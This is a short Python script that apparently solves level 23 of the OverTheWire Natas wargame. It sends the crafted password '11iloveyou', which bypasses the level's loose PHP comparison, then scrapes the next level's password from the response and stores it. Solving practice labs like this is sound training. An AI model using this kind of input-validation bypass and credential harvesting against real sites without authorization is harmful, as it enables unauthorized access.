import re,requests,natas,base64

B64 = 'Basic %s' % base64.b64encode('%s:%s' % ('natas23',natas.get_credential('natas23')))
URL = 'http://natas23.natas.labs.overthewire.org/index.php'
QUERY = '11iloveyou'

def main():
    response = requests.get (
            URL,
            headers=dict(Authorization=B64),
            params=dict(passwd=QUERY)
    )
    
    regex=r"Password: (\w+)"
    matches = re.finditer(regex,response.content,re.MULTILINE)

    for match in matches:
        print('found password: %s' % match.group(1))
        print('adding to credentials....')
        natas.save_credentials('natas24',match.group(1))
        print('done')

if __name__ == '__main__':
    main()
